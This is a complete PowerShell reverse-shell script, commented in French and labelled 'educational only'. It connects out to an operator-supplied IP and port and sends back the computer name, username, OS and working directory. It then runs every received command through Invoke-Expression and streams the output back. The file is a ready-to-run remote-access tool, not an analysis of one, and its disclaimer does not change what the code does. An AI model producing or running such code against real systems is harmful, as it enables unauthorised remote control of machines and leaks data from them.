# Reverse Shell en PowerShell - À des fins éducatives uniquement
# Usage: .\reverse_shell_powershell.ps1 -TargetIP "192.168.1.100" -TargetPort 4444

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,
    
    [Parameter(Mandatory=$true)]
    [int]$TargetPort
)

function Write-Info {
    param([string]$Message)
    Write-Host "[INFO] $Message" -ForegroundColor Green
}

function Write-Warn {
    param([string]$Message)
    Write-Host "[WARN] $Message" -ForegroundColor Yellow
}

function Write-Error-Custom {
    param([string]$Message)
    Write-Host "[ERROR] $Message" -ForegroundColor Red
}

function Start-ReverseShell {
    param(
        [string]$IP,
        [int]$Port
    )
    
    Write-Warn "Script éducatif - Utilisez uniquement dans un environnement autorisé"
    Write-Info "Tentative de connexion vers ${IP}:${Port}"
    
    try {
        # Création du socket TCP
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        
        Write-Info "Connexion établie avec ${IP}:${Port}"
        
        # Informations système
        $systemInfo = @"
Connexion PowerShell établie
Système: $($env:COMPUTERNAME)
Utilisateur: $($env:USERNAME)
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
Répertoire: $(Get-Location)

"@
        
        $data = ([text.encoding]::ASCII).GetBytes($systemInfo)
        $stream.Write($data, 0, $data.Length)
        
        # Boucle principale
        while ($client.Connected) {
            try {
                # Envoi du prompt
                $prompt = "PS $(Get-Location)> "
                $promptBytes = ([text.encoding]::ASCII).GetBytes($prompt)
                $stream.Write($promptBytes, 0, $promptBytes.Length)
                
                # Lecture de la commande
                $bytes = New-Object System.Byte[] 1024
                $bytesRead = $stream.Read($bytes, 0, $bytes.Length)
                
                if ($bytesRead -eq 0) {
                    break
                }
                
                $command = ([text.encoding]::ASCII).GetString($bytes, 0, $bytesRead).Trim()
                
                if ($command -eq "exit" -or $command -eq "quit") {
                    break
                }
                
                # Exécution de la commande
                try {
                    if ($command.StartsWith("cd ")) {
                        $newPath = $command.Substring(3).Trim()
                        if ($newPath -eq "") {
                            $newPath = $env:USERPROFILE
                        }
                        Set-Location $newPath -ErrorAction Stop
                        $result = "Répertoire changé vers: $(Get-Location)`n"
                    }
                    else {
                        $result = Invoke-Expression $command 2>&1 | Out-String
                        if ([string]::IsNullOrEmpty($result)) {
                            $result = "Commande exécutée (pas de sortie)`n"
                        }
                    }
                }
                catch {
                    $result = "Erreur: $($_.Exception.Message)`n"
                }
                
                # Envoi du résultat
                $resultBytes = ([text.encoding]::ASCII).GetBytes($result)
                $stream.Write($resultBytes, 0, $resultBytes.Length)
            }
            catch {
                Write-Error-Custom "Erreur dans la boucle: $($_.Exception.Message)"
                break
            }
        }
    }
    catch {
        Write-Error-Custom "Erreur de connexion: $($_.Exception.Message)"
    }
    finally {
        if ($stream) { $stream.Close() }
        if ($client) { $client.Close() }
        Write-Info "Connexion fermée"
    }
}

# Validation des paramètres
if (-not $TargetIP -or -not $TargetPort) {
    Write-Host "Usage: .\reverse_shell_powershell.ps1 -TargetIP `"192.168.1.100`" -TargetPort 4444" -ForegroundColor Cyan
    exit 1
}

if ($TargetPort -lt 1 -or $TargetPort -gt 65535) {
    Write-Error-Custom "Le port doit être entre 1 et 65535"
    exit 1
}

# Lancement du reverse shell
Start-ReverseShell -IP $TargetIP -Port $TargetPort